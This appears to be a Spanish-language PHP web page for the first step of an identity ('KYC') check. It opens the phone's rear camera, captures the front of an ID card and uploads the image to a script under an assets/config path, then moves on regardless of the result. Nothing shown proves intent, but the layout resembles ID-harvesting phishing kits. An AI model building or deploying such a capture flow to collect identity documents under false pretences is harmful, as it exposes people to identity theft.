<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verificación de Identidad</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Inter', sans-serif; background: #000; }

        .doc-container {
            position: relative;
            width: 100%;
            height: 100vh;
            background: #000;
            overflow: hidden;
        }

        #video-doc {
            position: absolute;
            top: 0; left: 0;
            width: 100%; height: 100%;
            object-fit: cover;
            z-index: 1;
        }

        .doc-overlay {
            position: absolute;
            top: 0; left: 0;
            width: 100%; height: 100%;
            z-index: 10;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            align-items: center;
            padding: 40px 20px 30px;
            background: rgba(0,0,0,0.35);
        }

        .doc-header {
            text-align: center;
            color: white;
            text-shadow: 0 2px 4px rgba(0,0,0,0.8);
        }
        .doc-header h2 { font-size: 22px; font-weight: 700; margin-bottom: 8px; }
        .doc-header p  { font-size: 14px; opacity: 0.85; }

        .guide-box {
            position: relative;
            width: 88%;
            max-width: 380px;
            aspect-ratio: 1.586;
            border-radius: 14px;
            box-shadow: 0 0 0 9999px rgba(0,0,0,0.75);
            z-index: 20;
        }
        .guide-box::before {
            content: '';
            position: absolute;
            inset: -4px;
            border-radius: 18px;
            border: 2px solid rgba(255,255,255,0.25);
            z-index: -1;
        }

        .corner {
            position: absolute;
            width: 28px; height: 28px;
            border-color: #00e676;
            border-width: 4px;
            border-style: solid;
            filter: drop-shadow(0 0 6px rgba(0,230,118,0.6));
        }
        .tl { top:0; left:0;  border-right:0; border-bottom:0; border-top-left-radius:12px; }
        .tr { top:0; right:0; border-left:0;  border-bottom:0; border-top-right-radius:12px; }
        .bl { bottom:0; left:0;  border-right:0; border-top:0; border-bottom-left-radius:12px; }
        .br { bottom:0; right:0; border-left:0;  border-top:0; border-bottom-right-radius:12px; }

        .scanner-line {
            position: absolute;
            width: 100%; height: 2px;
            background: #00e676;
            box-shadow: 0 0 6px #00e676, 0 0 12px #00e676;
            animation: scan 2s ease-in-out infinite;
        }
        @keyframes scan {
            0%   { top: 5%;  opacity: 0; }
            10%  { opacity: 1; }
            90%  { opacity: 1; }
            100% { top: 95%; opacity: 0; }
        }

        .step-indicator {
            display: flex;
            gap: 8px;
            align-items: center;
        }
        .step-dot {
            width: 8px; height: 8px;
            border-radius: 50%;
            background: rgba(255,255,255,0.35);
        }
        .step-dot.active { background: #00e676; }

        .doc-controls {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 16px;
            padding-bottom: 10px;
            z-index: 30;
        }

        .btn-capture {
            width: 72px; height: 72px;
            border-radius: 50%;
            border: 4px solid white;
            background: rgba(255,255,255,0.2);
            cursor: pointer;
            display: flex;
            justify-content: center;
            align-items: center;
            transition: all 0.2s;
        }
        .btn-capture:active { background: white; transform: scale(0.94); }
        .inner-circle { width: 52px; height: 52px; background: white; border-radius: 50%; }

        .capture-label {
            color: rgba(255,255,255,0.8);
            font-size: 13px;
            font-weight: 600;
            letter-spacing: 0.5px;
        }

        /* === Banner de error KYC === */
        .error-banner {
            display: none;
            position: fixed;
            top: 16px; left: 50%; transform: translateX(-50%);
            z-index: 999;
            background: #e53935;
            color: #fff;
            padding: 12px 22px;
            border-radius: 30px;
            font-size: 13px; font-weight: 600;
            box-shadow: 0 4px 16px rgba(0,0,0,0.4);
            text-align: center;
            max-width: 90%;
            animation: slideDown 0.4s ease;
        }
        .error-banner.show { display: block; }
        @keyframes slideDown {
            from { opacity:0; transform: translateX(-50%) translateY(-20px); }
            to   { opacity:1; transform: translateX(-50%) translateY(0); }
        }
    </style>
</head>
<body>

<?php if (!empty($_GET['error']) && $_GET['error'] === 'kyc_failed'): ?>
<div class="error-banner show" id="error-banner">
    ❌ Verificación fallida — Por favor repite el proceso con mejor iluminación
</div>
<script>
    setTimeout(() => document.getElementById('error-banner').classList.remove('show'), 5000);
</script>
<?php
endif; ?>
<div class="doc-container">
    <video id="video-doc" autoplay playsinline muted></video>

    <div class="doc-overlay">
        <div class="doc-header">
            <h2>Frente del Documento</h2>
            <p>Centra el lado frontal de tu cédula o documento</p>
        </div>

        <div class="guide-box">
            <div class="corner tl"></div>
            <div class="corner tr"></div>
            <div class="corner bl"></div>
            <div class="corner br"></div>
            <div class="scanner-line"></div>
        </div>

        <div class="doc-controls">
            <div class="step-indicator">
                <div class="step-dot active"></div>
                <div class="step-dot"></div>
                <div class="step-dot"></div>
            </div>
            <button id="btn-snap" class="btn-capture">
                <div class="inner-circle"></div>
            </button>
            <span class="capture-label">Paso 1 de 3 — Presiona para capturar</span>
        </div>
    </div>
</div>

<form id="docForm" method="POST" style="display:none;">
    <input type="hidden" name="image" id="imageInputDoc">
    <input type="hidden" name="tipo" value="front">
    <input type="hidden" name="id" value="<?php echo htmlspecialchars($_GET['id'] ?? ''); ?>">
</form>

<script>
    const transactionId = "<?php echo htmlspecialchars($_GET['id'] ?? ''); ?>";
    const video   = document.getElementById('video-doc');
    const btnSnap = document.getElementById('btn-snap');
    const imgInput = document.getElementById('imageInputDoc');

    // Cámara trasera
    navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: 'environment' } } })
        .catch(() => navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } }))
        .then(stream => { video.srcObject = stream; })
        .catch(() => alert('Error al acceder a la cámara.'));

    btnSnap.addEventListener('click', () => {
        btnSnap.style.opacity = '0.5';
        btnSnap.disabled = true;

        const canvas = document.createElement('canvas');
        canvas.width  = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);

        imgInput.value = canvas.toDataURL('image/jpeg', 0.88);

        // Subir imagen y pasar al siguiente paso
        const formData = new FormData();
        formData.append('image', imgInput.value);
        formData.append('tipo', 'front');
        formData.append('id', transactionId);

        fetch('assets/config/process_kyc.php', { method: 'POST', body: formData })
            .finally(() => {
                window.location.href = 'kyc_back.php?id=' + transactionId;
            });
    });
</script>
</body>
</html>
